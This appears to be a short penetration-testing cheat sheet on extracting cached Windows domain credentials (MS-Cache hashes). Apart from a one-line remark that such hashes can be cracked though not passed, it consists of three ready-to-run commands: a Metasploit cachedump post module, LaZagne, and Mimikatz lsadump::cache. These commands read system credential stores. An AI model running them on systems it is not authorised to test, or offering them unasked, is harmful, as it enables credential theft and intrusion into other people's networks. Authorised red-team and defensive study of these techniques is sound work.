# Cached Credentials

## Note:

MS-Cache password hashes cannot be used in Pass-The-Hash (Pth) attacks. However, they can be cracked to reveal the clear-text password.

### 1) Metasploit

    use post/windows/gather/cachedump

### 2) LaZagne

    LaZagne.exe windows

### 3) Mimikatz

    Invoke-Mimikatz -Command '"lsadump::cache"'
